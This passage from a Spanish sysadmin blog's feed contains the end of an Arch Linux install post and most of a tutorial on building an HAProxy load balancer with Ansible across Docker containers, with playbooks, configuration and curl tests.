tmpfs            250M      &lt;span class="m"&gt;0&lt;/span&gt;  250M   &lt;span class="m"&gt;0&lt;/span&gt;% /dev/shm
tmpfs            250M      &lt;span class="m"&gt;0&lt;/span&gt;  250M   &lt;span class="m"&gt;0&lt;/span&gt;% /sys/fs/cgroup
tmpfs            250M      &lt;span class="m"&gt;0&lt;/span&gt;  250M   &lt;span class="m"&gt;0&lt;/span&gt;% /tmp
tmpfs             50M      &lt;span class="m"&gt;0&lt;/span&gt;   50M   &lt;span class="m"&gt;0&lt;/span&gt;% /run/user/0
&lt;span class="o"&gt;[&lt;/span&gt;root@archlinux ~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c1"&gt;# free -m&lt;/span&gt;
              total        used        free      shared  buff/cache   available
Mem:            &lt;span class="m"&gt;498&lt;/span&gt;          &lt;span class="m"&gt;10&lt;/span&gt;         &lt;span class="m"&gt;441&lt;/span&gt;           &lt;span class="m"&gt;0&lt;/span&gt;          &lt;span class="m"&gt;46&lt;/span&gt;         &lt;span class="m"&gt;470&lt;/span&gt;
Swap:           &lt;span class="m"&gt;522&lt;/span&gt;           &lt;span class="m"&gt;0&lt;/span&gt;         &lt;span class="m"&gt;522&lt;/span&gt;
&lt;span class="o"&gt;[&lt;/span&gt;root@archlinux ~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c1"&gt;#&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;A partir de aquí podemos construir a base de instalar aquellos paquetes que necesitemos (escritorio, servicios, ...); sin embargo, esto queda para futuros artículos.&lt;/p&gt;</content><category term="linux"></category><category term="archlinux"></category><category term="distribución"></category></entry><entry><title>Balanceando peticiones con HAProxy</title><link href="http://www.linuxsysadmin.ml/2016/06/balanceando-peticiones-con-haproxy.html" rel="alternate"></link><published>2016-06-27T08:00:00+02:00</published><updated>2016-06-27T08:00:00+02:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2016-06-27:/2016/06/balanceando-peticiones-con-haproxy.html</id><summary type="html">&lt;p&gt;Cuando tenemos un entorno grande o con previsiones de crecimiento, nos interesa poder poner a trabajar varios servidores similares. En casos así nos hace falta un &lt;strong&gt;balanceador de carga&lt;/strong&gt;, que actúa como un agente de tráfico, dirigiendo las peticiones que él mismo recibe a los diferentes servidores, por ejemplo, &lt;strong&gt;haproxy …&lt;/strong&gt;&lt;/p&gt;</summary><content type="html">&lt;p&gt;Cuando tenemos un entorno grande o con previsiones de crecimiento, nos interesa poder poner a trabajar varios servidores similares. En casos así nos hace falta un &lt;strong&gt;balanceador de carga&lt;/strong&gt;, que actúa como un agente de tráfico, dirigiendo las peticiones que él mismo recibe a los diferentes servidores, por ejemplo, &lt;strong&gt;haproxy&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;En este artículo vamos a montar el balanceador &lt;strong&gt;haproxy&lt;/strong&gt;, usando &lt;strong&gt;ansible&lt;/strong&gt;, basándonos en las imágenes &lt;strong&gt;docker&lt;/strong&gt; de &lt;a href="http://www.linuxsysadmin.ml/2016/06/controlando-contenedores-docker-con-ansible.html"&gt;otro artículo&lt;/a&gt;. La ideas es que vamos a poner un único balanceador que va a escuchar en dos puertos, balanceando dos &lt;em&gt;backends&lt;/em&gt; en cada uno, por ejemplo una web y una &lt;em&gt;api&lt;/em&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~/build$ docker images
REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
slave               latest              22a9312a1315        About an hour ago   &lt;span class="m"&gt;186&lt;/span&gt; MB
ansible             latest              225b431d2133        About an hour ago   &lt;span class="m"&gt;245&lt;/span&gt;.5 MB
debian              latest              bb5d89f9b6cb        &lt;span class="m"&gt;2&lt;/span&gt; weeks ago         &lt;span class="m"&gt;125&lt;/span&gt;.1 MB
gerard@sirius:~/build$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Preparando el entorno&lt;/h2&gt;
&lt;p&gt;El primer paso es disponer de una red para que todos los servidores implicados se puedan comunicar entre ellos. La red que viene por defecto nos permite eso, pero vamos a crear una red &lt;em&gt;user defined&lt;/em&gt; que nos va a permitir que los contenedores &lt;strong&gt;docker&lt;/strong&gt; se conozcan entre ellos por su nombre.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~/build$ docker network create --subnet&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;172&lt;/span&gt;.20.0.0/16 balancing
4585a1abd0ed69bc9d1daf0dd019e1f129a9e7328471da77541f5b4a54c19626
gerard@sirius:~/build$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Se trata de levantar 5 servidores: 1 para &lt;strong&gt;haproxy&lt;/strong&gt; y otros 4 para representar los servidores de &lt;em&gt;backend&lt;/em&gt;, que vamos a trucar para que parezca lo que no son. Es importante &lt;em&gt;publicar&lt;/em&gt; los puertos que queramos exponer, para ver que funciona la solución final; si queremos balancear los puertos 8080 (web), 8081 (api) y 1936 (haproxy stats), pondríamos algo como esto:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~$ docker run -d -h balancer --name balancer --net balancing -p &lt;span class="m"&gt;8080&lt;/span&gt;:8080 -p &lt;span class="m"&gt;8081&lt;/span&gt;:8081 -p &lt;span class="m"&gt;1936&lt;/span&gt;:1936 slave
70e4811e6a498c7ecdec11ed91609d43749c327e33bd3b06b1532b507f3f2141
gerard@sirius:~/build$ &lt;span class="k"&gt;for&lt;/span&gt; host in web1 web2 api1 api2&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="k"&gt;do&lt;/span&gt; docker run -d -h &lt;span class="nv"&gt;$host&lt;/span&gt; --name &lt;span class="nv"&gt;$host&lt;/span&gt; --net balancing slave&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="k"&gt;done&lt;/span&gt;
82be4f7788f0186834311fe625f4ae24908a59a25df8b246aeb18d13cdff7b3d
a0514880a44ed9109d19dc594ae991245e052554d91f0b08da80d57808df3d29
1217fd05aa321e52e0038e4870dd29776e843d88de03520ad0bffee6cb786b54
635c9b2d04482018053dca4b4225a34d3a11be1c366e372b9536fcadea12a15a
gerard@sirius:~/build$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Verificamos que tenemos todos nuestros contenedores corriendo:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~/build$ docker ps
CONTAINER ID        IMAGE               COMMAND               CREATED              STATUS              PORTS                                                      NAMES
635c9b2d0448        slave               &amp;quot;/usr/sbin/sshd -D&amp;quot;   10 seconds ago       Up 8 seconds                                                                   api2
1217fd05aa32        slave               &amp;quot;/usr/sbin/sshd -D&amp;quot;   11 seconds ago       Up 9 seconds                                                                   api1
a0514880a44e        slave               &amp;quot;/usr/sbin/sshd -D&amp;quot;   12 seconds ago       Up 10 seconds                                                                  web2
82be4f7788f0        slave               &amp;quot;/usr/sbin/sshd -D&amp;quot;   13 seconds ago       Up 12 seconds                                                                  web1
70e4811e6a49        slave               &amp;quot;/usr/sbin/sshd -D&amp;quot;   About a minute ago   Up About a minute   0.0.0.0:1936-&amp;gt;1936/tcp, 0.0.0.0:8080-8081-&amp;gt;8080-8081/tcp   balancer
gerard@sirius:~/build$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Preparando las herramientas&lt;/h2&gt;
&lt;p&gt;Como ya hemos comentado, vamos a utilizar &lt;strong&gt;ansible&lt;/strong&gt;. Para ejecutar los &lt;em&gt;playbooks&lt;/em&gt;, vamos a levantar una máquina para usar y tirar.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~/build$ docker run -ti --rm --net balancing -h ansible --name ansible ansible
root@ansible:/# &lt;span class="nb"&gt;cd&lt;/span&gt; /root
root@ansible:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Especificamos un fichero de &lt;em&gt;hosts&lt;/em&gt; que va a servir para indicar los contenedores que tenemos y vamos a instalar paquetes en función de su grupo.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@ansible:~# cat hosts 
&lt;span class="o"&gt;[&lt;/span&gt;all:vars&lt;span class="o"&gt;]&lt;/span&gt;
&lt;span class="nv"&gt;ansible_user&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; ansible
&lt;span class="nv"&gt;ansible_ssh_pass&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; s3cr3t
&lt;span class="nv"&gt;ansible_become&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;true&lt;/span&gt;
&lt;span class="nv"&gt;ansible_become_method&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; sudo
&lt;span class="nv"&gt;ansible_become_user&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; root
&lt;span class="nv"&gt;ansible_become_pass&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; s3cr3t

&lt;span class="o"&gt;[&lt;/span&gt;balancers&lt;span class="o"&gt;]&lt;/span&gt;
balancer

&lt;span class="o"&gt;[&lt;/span&gt;webs&lt;span class="o"&gt;]&lt;/span&gt;
web1
web2

&lt;span class="o"&gt;[&lt;/span&gt;apis&lt;span class="o"&gt;]&lt;/span&gt;
api1
api2
root@ansible:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Opcionalmente, verificamos que todos los contenedores son accesibles desde &lt;strong&gt;ansible&lt;/strong&gt;. Eso nos puede evitar sorpresas futuras.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@ansible:~# ansible -i hosts -m ping all
balancer &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="nv"&gt;SUCCESS&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;&amp;gt; &lt;span class="o"&gt;{&lt;/span&gt;
    &lt;span class="s2"&gt;&amp;quot;changed&amp;quot;&lt;/span&gt;: false, 
    &lt;span class="s2"&gt;&amp;quot;ping&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;pong&amp;quot;&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;
api2 &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="nv"&gt;SUCCESS&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;&amp;gt; &lt;span class="o"&gt;{&lt;/span&gt;
    &lt;span class="s2"&gt;&amp;quot;changed&amp;quot;&lt;/span&gt;: false, 
    &lt;span class="s2"&gt;&amp;quot;ping&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;pong&amp;quot;&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;
api1 &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="nv"&gt;SUCCESS&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;&amp;gt; &lt;span class="o"&gt;{&lt;/span&gt;
    &lt;span class="s2"&gt;&amp;quot;changed&amp;quot;&lt;/span&gt;: false, 
    &lt;span class="s2"&gt;&amp;quot;ping&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;pong&amp;quot;&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;
web2 &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="nv"&gt;SUCCESS&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;&amp;gt; &lt;span class="o"&gt;{&lt;/span&gt;
    &lt;span class="s2"&gt;&amp;quot;changed&amp;quot;&lt;/span&gt;: false, 
    &lt;span class="s2"&gt;&amp;quot;ping&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;pong&amp;quot;&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;
web1 &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="nv"&gt;SUCCESS&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;&amp;gt; &lt;span class="o"&gt;{&lt;/span&gt;
    &lt;span class="s2"&gt;&amp;quot;changed&amp;quot;&lt;/span&gt;: false, 
    &lt;span class="s2"&gt;&amp;quot;ping&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;pong&amp;quot;&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;
root@ansible:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Instalando unos backends sustitutos&lt;/h2&gt;
&lt;p&gt;Sea lo que sea que vayan a ejecutar los &lt;em&gt;backends&lt;/em&gt; reales, los podemos ver como una caja negra que ofrecen sus servicios mediante protocolo TCP/IP en un puerto concreto.&lt;/p&gt;
&lt;p&gt;Como no nos importa demasiado lo que hagan, y para simplificar el artículo, los vamos a reemplazar con servidores web &lt;strong&gt;nginx&lt;/strong&gt;, sirviendo un fichero HTML con su nombre (para poder distinguirlos en las pruebas). De esta forma, podremos ver el tipo de servidor que responde (api o web) y su número, ya que ambos datos están en su &lt;em&gt;hostname&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Así pues, basta con un &lt;em&gt;playbook&lt;/em&gt; que instale el servidor web y ponga el fichero &lt;em&gt;.html&lt;/em&gt; en su sitio. Como &lt;strong&gt;docker&lt;/strong&gt; está ejecutando el servidor &lt;strong&gt;ssh&lt;/strong&gt; y no &lt;strong&gt;systemd&lt;/strong&gt;, el &lt;strong&gt;nginx&lt;/strong&gt; no se levanta. Con otra tarea para asegurar que está corriendo, basta.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@ansible:~# cat backends.yml 
- hosts: webs, apis
  tasks:
    - apt: &lt;span class="nv"&gt;name&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;nginx-light &lt;span class="nv"&gt;state&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;present
    - copy: &lt;span class="nv"&gt;content&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Content from {{ inventory_hostname }}&amp;quot;&lt;/span&gt; &lt;span class="nv"&gt;dest&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/var/www/html/index.html
    - service: &lt;span class="nv"&gt;name&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;nginx &lt;span class="nv"&gt;state&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;started
root@ansible:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Lanzamos el &lt;em&gt;playbook&lt;/em&gt;, y los dejamos preparados para que el balanceador los pueda usar. En un entorno real, dedicaríamos mas tiempo en poner servidores de aplicaciones normales, con aplicaciones adecuadas, y que posiblemente usarían algún tipo de base de datos.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@ansible:~# ansible-playbook -i hosts backends.yml 

PLAY &lt;span class="o"&gt;[&lt;/span&gt;webs, apis&lt;span class="o"&gt;]&lt;/span&gt; **************************************************************

TASK &lt;span class="o"&gt;[&lt;/span&gt;setup&lt;span class="o"&gt;]&lt;/span&gt; *******************************************************************
ok: &lt;span class="o"&gt;[&lt;/span&gt;web2&lt;span class="o"&gt;]&lt;/span&gt;
ok: &lt;span class="o"&gt;[&lt;/span&gt;api1&lt;span class="o"&gt;]&lt;/span&gt;
ok: &lt;span class="o"&gt;[&lt;/span&gt;web1&lt;span class="o"&gt;]&lt;/span&gt;
ok: &lt;span class="o"&gt;[&lt;/span&gt;api2&lt;span class="o"&gt;]&lt;/span&gt;

TASK &lt;span class="o"&gt;[&lt;/span&gt;apt&lt;span class="o"&gt;]&lt;/span&gt; *********************************************************************
changed: &lt;span class="o"&gt;[&lt;/span&gt;api1&lt;span class="o"&gt;]&lt;/span&gt;
changed: &lt;span class="o"&gt;[&lt;/span&gt;api2&lt;span class="o"&gt;]&lt;/span&gt;
changed: &lt;span class="o"&gt;[&lt;/span&gt;web1&lt;span class="o"&gt;]&lt;/span&gt;
changed: &lt;span class="o"&gt;[&lt;/span&gt;web2&lt;span class="o"&gt;]&lt;/span&gt;

TASK &lt;span class="o"&gt;[&lt;/span&gt;copy&lt;span class="o"&gt;]&lt;/span&gt; ********************************************************************
changed: &lt;span class="o"&gt;[&lt;/span&gt;web1&lt;span class="o"&gt;]&lt;/span&gt;
changed: &lt;span class="o"&gt;[&lt;/span&gt;web2&lt;span class="o"&gt;]&lt;/span&gt;
changed: &lt;span class="o"&gt;[&lt;/span&gt;api2&lt;span class="o"&gt;]&lt;/span&gt;
changed: &lt;span class="o"&gt;[&lt;/span&gt;api1&lt;span class="o"&gt;]&lt;/span&gt;

TASK &lt;span class="o"&gt;[&lt;/span&gt;service&lt;span class="o"&gt;]&lt;/span&gt; *****************************************************************
changed: &lt;span class="o"&gt;[&lt;/span&gt;web1&lt;span class="o"&gt;]&lt;/span&gt;
changed: &lt;span class="o"&gt;[&lt;/span&gt;web2&lt;span class="o"&gt;]&lt;/span&gt;
changed: &lt;span class="o"&gt;[&lt;/span&gt;api1&lt;span class="o"&gt;]&lt;/span&gt;
changed: &lt;span class="o"&gt;[&lt;/span&gt;api2&lt;span class="o"&gt;]&lt;/span&gt;

PLAY RECAP *********************************************************************
api1                       : &lt;span class="nv"&gt;ok&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;4&lt;/span&gt;    &lt;span class="nv"&gt;changed&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;3&lt;/span&gt;    &lt;span class="nv"&gt;unreachable&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;    &lt;span class="nv"&gt;failed&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;   
api2                       : &lt;span class="nv"&gt;ok&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;4&lt;/span&gt;    &lt;span class="nv"&gt;changed&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;3&lt;/span&gt;    &lt;span class="nv"&gt;unreachable&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;    &lt;span class="nv"&gt;failed&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;   
web1                       : &lt;span class="nv"&gt;ok&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;4&lt;/span&gt;    &lt;span class="nv"&gt;changed&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;3&lt;/span&gt;    &lt;span class="nv"&gt;unreachable&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;    &lt;span class="nv"&gt;failed&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;   
web2                       : &lt;span class="nv"&gt;ok&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;4&lt;/span&gt;    &lt;span class="nv"&gt;changed&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;3&lt;/span&gt;    &lt;span class="nv"&gt;unreachable&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;    &lt;span class="nv"&gt;failed&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;   

root@ansible:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Montando el balanceador&lt;/h2&gt;
&lt;p&gt;Para obtener un balanceador HTTP (o TCP, si lo necesitáramos), basta con elegir uno. Normalmente yo usaría un servidor &lt;strong&gt;nginx&lt;/strong&gt; para balancear HTTP (que además ofrece otras funcionalidades, aunque no soporte TCP directo); en este caso, y para variar un poco, vamos a poner &lt;strong&gt;haproxy&lt;/strong&gt;, que nos ofrece una bonita página de estadísticas.&lt;/p&gt;
&lt;p&gt;El truco está en instalar &lt;strong&gt;haproxy&lt;/strong&gt;, darle un fichero de configuración adecuado y recargar su configuración. Nuevamente, al tratarse de &lt;strong&gt;docker&lt;/strong&gt; hay que asegurarse que el servicio esté levantado.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@ansible:~# cat balancer.yml 
- hosts: balancer
  tasks:
    - apt: &lt;span class="nv"&gt;name&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;haproxy &lt;span class="nv"&gt;state&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;present
    - service: &lt;span class="nv"&gt;name&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;haproxy &lt;span class="nv"&gt;state&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;started
    - copy: &lt;span class="nv"&gt;src&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;haproxy.cfg &lt;span class="nv"&gt;dest&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/etc/haproxy/haproxy.cfg
    - service: &lt;span class="nv"&gt;name&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;haproxy &lt;span class="nv"&gt;state&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;reloaded
root@ansible:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;La funcionalidad con la que cumpla el balanceador se controla en &lt;em&gt;/etc/haproxy/haproxy.cfg&lt;/em&gt;, que el &lt;em&gt;playbook&lt;/em&gt; pone en su sitio, desde una carpeta en el contexto.&lt;/p&gt;
&lt;p&gt;HAProxy funciona mapeando &lt;em&gt;frontends&lt;/em&gt; (entradas del balanceador) con sus respectivos &lt;em&gt;backends&lt;/em&gt; (servidores que atienden peticiones).&lt;/p&gt;
&lt;p&gt;Disponemos de varios algoritmos de balanceo, así que vamos a poner uno distinto para cada &lt;em&gt;backend&lt;/em&gt;. Para la web, vamos a usar &lt;em&gt;roundrobin&lt;/em&gt;, que básicamente se trata de una petición a cada uno por turnos; la &lt;em&gt;api&lt;/em&gt; va a contar con el algoritmo &lt;em&gt;leastconn&lt;/em&gt;, que significa darle una petición al servidor que menos conexiones tiene abiertas.&lt;/p&gt;
&lt;p&gt;Como &lt;em&gt;bonus track&lt;/em&gt;, vamos a habilitar la página de estadísticas, siempre que la queramos, claro. La he copiado tal cual de la documentación de &lt;strong&gt;haproxy&lt;/strong&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@ansible:~# cat haproxy.cfg 
listen stats :1936
    mode http
    stats enable
    stats hide-version
    stats uri /

frontend web
    bind :8080
    default_backend webs

backend webs
    balance roundrobin
    server web1 web1:80
    server web2 web2:80

frontend api
    bind :8081
    default_backend apis

backend apis
    balance leastconn
    server api1 api1:80
    server api2 api2:80
root@ansible:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Solo nos faltaría lanzar el &lt;em&gt;playbook&lt;/em&gt; para que quede todo correctamente montado. Si la configuración cambiara o hubiera que corregirla, se debe modificar el fichero local &lt;em&gt;haproxy.cfg&lt;/em&gt; y relanzar el &lt;em&gt;playbook&lt;/em&gt;. &lt;strong&gt;Ansible&lt;/strong&gt; no intentará cambiar nada que ya esté como debía; no instalará &lt;strong&gt;haproxy&lt;/strong&gt; de nuevo, no lo levantará si ya estaba corriendo, no copiará el fichero a menos que haya cambiado, y siempre va a recargar la configuración del servicio.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@ansible:~# ansible-playbook -i hosts balancer.yml 

PLAY &lt;span class="o"&gt;[&lt;/span&gt;balancer&lt;span class="o"&gt;]&lt;/span&gt; ****************************************************************

TASK &lt;span class="o"&gt;[&lt;/span&gt;setup&lt;span class="o"&gt;]&lt;/span&gt; *******************************************************************
ok: &lt;span class="o"&gt;[&lt;/span&gt;balancer&lt;span class="o"&gt;]&lt;/span&gt;

TASK &lt;span class="o"&gt;[&lt;/span&gt;apt&lt;span class="o"&gt;]&lt;/span&gt; *********************************************************************
changed: &lt;span class="o"&gt;[&lt;/span&gt;balancer&lt;span class="o"&gt;]&lt;/span&gt;

TASK &lt;span class="o"&gt;[&lt;/span&gt;service&lt;span class="o"&gt;]&lt;/span&gt; *****************************************************************
changed: &lt;span class="o"&gt;[&lt;/span&gt;balancer&lt;span class="o"&gt;]&lt;/span&gt;

TASK &lt;span class="o"&gt;[&lt;/span&gt;copy&lt;span class="o"&gt;]&lt;/span&gt; ********************************************************************
changed: &lt;span class="o"&gt;[&lt;/span&gt;balancer&lt;span class="o"&gt;]&lt;/span&gt;

TASK &lt;span class="o"&gt;[&lt;/span&gt;service&lt;span class="o"&gt;]&lt;/span&gt; *****************************************************************
changed: &lt;span class="o"&gt;[&lt;/span&gt;balancer&lt;span class="o"&gt;]&lt;/span&gt;

PLAY RECAP *********************************************************************
balancer                   : &lt;span class="nv"&gt;ok&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;5&lt;/span&gt;    &lt;span class="nv"&gt;changed&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;4&lt;/span&gt;    &lt;span class="nv"&gt;unreachable&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;    &lt;span class="nv"&gt;failed&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;   

root@ansible:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Comprobando el funcionamiento&lt;/h2&gt;
&lt;p&gt;Si hacemos peticiones individuales, vemos que cada servidor funciona, pero lo que nos importa es el conjunto. Para ello vamos a solicitar peticiones a cada uno de los puertos que representan el &lt;em&gt;cluster&lt;/em&gt; de web y de &lt;em&gt;api&lt;/em&gt;. Puesto que los hemos publicado con el mismo número de puerto en la máquina anfitriona, lo podemos lanzar ahí mismo.&lt;/p&gt;
&lt;p&gt;Hacemos unas peticines al &lt;em&gt;cluster&lt;/em&gt; de web, que se esconde detrás del puerto 8080, y comprobamos que van alternando un &lt;em&gt;backend&lt;/em&gt; u otro por turnos.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~$ curl http://localhost:8080/ &lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;
Content from web1
gerard@sirius:~$ curl http://localhost:8080/ &lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;
Content from web2
gerard@sirius:~$ curl http://localhost:8080/ &lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;
Content from web1
gerard@sirius:~$ curl http://localhost:8080/ &lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;
Content from web2
gerard@sirius:~$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Repetimos el procedimiento para la &lt;em&gt;api&lt;/em&gt;, que se esconde en el puerto 8081 del balanceador:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~$ curl http://localhost:8081/ &lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;
Content from api1
gerard@sirius:~$ curl http://localhost:8081/ &lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;
Content from api2
gerard@sirius:~$ curl http://localhost:8081/ &lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;
Content from api1
gerard@sirius:~$ curl http://localhost:8081/ &lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;
Content from api2
gerard@sirius:~$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y solo nos queda ver que la página de estadísticas funciona y nos resulta útil. Puesto que devuelve una página web completa, lo vamos a ver en un navegador cualquiera.&lt;/p&gt;
